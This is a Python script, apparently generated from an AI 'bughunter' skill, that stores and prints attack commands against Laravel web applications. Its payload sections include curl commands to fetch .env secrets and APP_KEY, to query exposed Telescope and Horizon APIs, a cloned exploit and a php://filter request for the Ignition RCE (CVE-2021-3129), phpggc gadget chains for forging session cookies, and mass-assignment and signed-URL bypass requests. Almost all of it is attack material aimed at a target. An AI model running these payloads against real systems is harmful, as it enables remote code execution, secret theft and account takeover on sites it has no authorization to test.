#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-laravel

Skill: HUNT-LARAVEL — Laravel Specific Vulnerabilities
Desc : Hunt Laravel specific vulnerabilities — Debug mode leakage (APP_DEBUG=true exposes full stack trace + env vars), Laravel Telescope/Horizon dashboard unauthorized access, Ignition RCE (CVE-2021-3129), Signed URL manipulation, Queue Worker abuse, mass assignment via Eloquent, deserialization via cookies, .env file exposure. Use when target runs Laravel (PHP) — detected via X-Powered-By, Laravel session cookies, or /storage/ paths.

Run:  python claude-bughunter-hunt-laravel.py --help
      python claude-bughunter-hunt-laravel.py --list
      python claude-bughunter-hunt-laravel.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-laravel'
TITLE = 'HUNT-LARAVEL — Laravel Specific Vulnerabilities'
DESCRIPTION = 'Hunt Laravel specific vulnerabilities — Debug mode leakage (APP_DEBUG=true exposes full stack trace + env vars), Laravel Telescope/Horizon dashboard unauthorized access, Ignition RCE (CVE-2021-3129), Signed URL manipulation, Queue Worker abuse, mass assignment via Eloquent, deserialization via cookies, .env file exposure. Use when target runs Laravel (PHP) — detected via X-Powered-By, Laravel session cookies, or /storage/ paths.'

PAYLOADS = {
    'main': ["name: hunt-laravel", "description: Hunt Laravel specific vulnerabilities \u2014 Debug mode leakage (APP_DEBUG=true exposes full stack trace + env vars), Laravel Telescope/Horizon dashboard unauthorized access, Ignition RCE (CVE-2021-3129), Signed URL manipulation, Queue Worker abuse, mass assignment via Eloquent, deserialization via cookies, .env file exposure. Use when target runs Laravel (PHP) \u2014 detected via X-Powered-By, Laravel session cookies, or /storage/ paths.", "sources: hackerone_public, cve_database", "report_count: 14"],
    'hunt-laravel-laravel-specific-vulnerabilities': [],
    'crown-jewel-targets': ["Laravel debug mode enabled in production = instant RCE via Ignition (CVE-2021-3129).", "**Highest-value findings:**", "- **Ignition RCE (CVE-2021-3129)** \u2014 `APP_DEBUG=true` + Laravel < 8.4.2 \u2192 `/_ignition/execute-solution` RCE without auth", "- **Telescope dashboard** \u2014 `/telescope` exposes full request/response logs, DB queries, Redis commands, scheduled jobs, environment variables", "- **Horizon dashboard** \u2014 `/horizon` exposes queue job details, failed jobs with full payloads (may contain API keys, PII)", "- **Signed URL manipulation** \u2014 if `URL::signedRoute` validates wrong params \u2192 bypass signed URL \u2192 unauthorized actions", "- **.env exposure** \u2014 `APP_KEY` leaked \u2192 decrypt all encrypted cookies \u2192 forge session \u2192 ATO"],
    'phase-1-fingerprint-laravel': ["```bash"],
    'laravel-specific-indicators': ["curl -sI https://$TARGET/ | grep -i \"laravel_session\\|x-powered-by.*php\"", "curl -s https://$TARGET/ | grep -i \"laravel\\|Illuminate\\|csrf-token\""],
    'common-laravel-paths': ["for path in /storage /public /resources \"/vendor/laravel\" \"/.env\" \"/artisan\"; do", "STATUS=$(curl -s -o /dev/null -w \"%{http_code}\" \"https://$TARGET$path\")", "[ \"$STATUS\" != \"404\" ] && echo \"$path: $STATUS\""],
    'check-error-page-trigger-404': ["curl -s \"https://$TARGET/definitely-does-not-exist-xyz\" | grep -i \"laravel\\|Whoops\\|Ignition\\|symfony\""],
    'phase-2-debug-mode-ignition-rce-cve-2021-3129': ["```bash"],
    'step-1-check-if-debug-mode-is-enabled-whoops-error-page': ["curl -s \"https://$TARGET/nonexistent\" | grep -i \"Whoops\\|APP_DEBUG\\|Ignition\""],
    'if-whoops-ignition-is-visible-debug-mode-on-test-cve-2021-3129': [],
    'step-2-check-ignition-endpoint': ["curl -s \"https://$TARGET/_ignition/health-check\" | head -5"],
    'step-3-cve-2021-3129-laravel-8-4-2-rce-via-log-file-manipulation': [],
    'requires-debug-mode-writable-storage-logs': [],
    'tool-ambionics-laravel-ignition-rce': ["git clone https://github.com/ambionics/laravel-ignition-rce /tmp/laravel-rce", "php /tmp/laravel-rce/exploit.php https://$TARGET \"id\""],
    'manual-test-send-solution-request': ["curl -s -X POST \"https://$TARGET/_ignition/execute-solution\" \\", "-H \"Content-Type: application/json\" \\", "-d '{", "\"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\",", "\"parameters\": {", "\"variableName\": \"x\",", "\"viewFile\": \"php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log\""],
    'phase-3-laravel-telescope-horizon': ["```bash"],
    'telescope-request-response-logs-db-queries-jobs-cache-events': ["curl -s \"https://$TARGET/telescope\" | grep -i \"telescope\\|laravel\"", "curl -s \"https://$TARGET/telescope/api/requests\" | python3 -m json.tool 2>/dev/null | head -50", "curl -s \"https://$TARGET/telescope/api/commands\" | python3 -m json.tool 2>/dev/null | head -30", "curl -s \"https://$TARGET/telescope/api/redis\" | python3 -m json.tool 2>/dev/null | head -30", "curl -s \"https://$TARGET/telescope/api/environment\" | python3 -m json.tool 2>/dev/null | head -50"],
    'horizon-queue-worker-dashboard': ["curl -s \"https://$TARGET/horizon\" | grep -i \"horizon\\|laravel\"", "curl -s \"https://$TARGET/horizon/api/stats\" | python3 -m json.tool 2>/dev/null", "curl -s \"https://$TARGET/horizon/api/jobs/failed\" | python3 -m json.tool 2>/dev/null | head -50"],
    'failed-job-payloads-often-contain-full-request-data-including-auth-tokens': [],
    'common-paths': ["for path in /telescope /telescope/requests /telescope/api /horizon /horizon/api/stats; do", "STATUS=$(curl -s -o /dev/null -w \"%{http_code}\" \"https://$TARGET$path\")", "[ \"$STATUS\" = \"200\" ] && echo \"[+] ACCESSIBLE: $TARGET$path\""],
    'phase-4-env-file-app-key-exposure': ["```bash"],
    'direct-env-access': ["curl -s \"https://$TARGET/.env\" | grep -i \"APP_KEY\\|DB_PASSWORD\\|SECRET\\|KEY\"", "curl -s \"https://$TARGET/.env.production\"", "curl -s \"https://$TARGET/.env.backup\"", "curl -s \"https://$TARGET/.env.local\""],
    'if-app-key-found': ["APP_KEY=\"base64:XXXXXXX\"", "echo \"APP_KEY=$APP_KEY\""],
    'can-decrypt-all-laravel-encrypted-cookies': [],
    'can-forge-session-cookies-ato-for-any-user': [],
    'also-check': ["curl -s \"https://$TARGET/storage/logs/laravel.log\" | tail -100 | grep -i \"exception\\|error\\|key\\|password\""],
    'phase-5-signed-url-manipulation': ["```bash"],
    'laravel-signed-urls-contain-signature-param-signature-hash': [],
    'find-signed-url-endpoints': ["cat recon/$TARGET/urls.txt | grep \"signature=\""],
    'test-modify-a-non-signature-parameter-should-fail-validation': ["SIGNED_URL=\"https://$TARGET/unsubscribe?user=123&email=test@test.com&signature=VALID_SIG\""],
    'modify-user-id-should-fail-if-properly-signed': ["curl -s \"${SIGNED_URL/user=123/user=999}\""],
    'test-signature-bypass-remove-signature-entirely': ["curl -s \"${SIGNED_URL/&signature=VALID_SIG/}\""],
    'test-does-the-app-validate-all-parameters-or-just-some': ["curl -s \"${SIGNED_URL}&extra=malicious\""],
    'phase-6-mass-assignment-via-eloquent': ["```bash"],
    'laravel-eloquent-orm-if-model-uses-guarded-or-fillable-improperly': [],
    'test-add-extra-fields-to-update-create-requests': [],
    'profile-update': ["curl -s -X POST \"https://$TARGET/api/profile\" \\", "-H \"Cookie: laravel_session=SESSION\" \\", "-H \"Content-Type: application/json\" \\", "-d '{\"name\": \"Test\", \"email\": \"test@test.com\", \"is_admin\": true, \"role\": \"admin\"}'"],
    'registration': ["curl -s -X POST \"https://$TARGET/api/register\" \\", "-H \"Content-Type: application/json\" \\", "-d '{\"name\": \"Test\", \"email\": \"test@new.com\", \"password\": \"test123\", \"verified\": true, \"admin\": 1}'"],
    'phase-7-laravel-cookie-deserialization': ["```bash"],
    'if-app-key-is-known-forge-a-session-cookie-with-malicious-serialized-payload': [],
    'uses-phpggc-gadget-chains': [],
    'get-the-app-key': ["APP_KEY=$(curl -s \"https://$TARGET/.env\" | grep \"^APP_KEY=\" | cut -d= -f2)"],
    'generate-payload-with-phpggc': ["php phpggc Laravel/RCE5 system 'id' | base64"],
    'sign-the-cookie-with-the-app-key-using-laravel-cookie-forge-script': [],
    'python3-laravel-cookie-forge-py-key-app-key-payload-phpggc-payload': [],
    'chain-table': [],
    'validation': ["\u2705 Ignition RCE: `id` command output returned in response", "\u2705 Telescope: API responses contain DB queries with credentials or user tokens", "\u2705 APP_KEY: Forged session cookie accepted, returns another user's profile", "\u2705 Mass assignment: `is_admin: true` accepted, account now has admin privileges", "**Severity:**", "- Ignition RCE: Critical", "- Telescope/Horizon with sensitive data: High", "- .env with APP_KEY: Critical", "- Mass assignment to admin: Critical"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()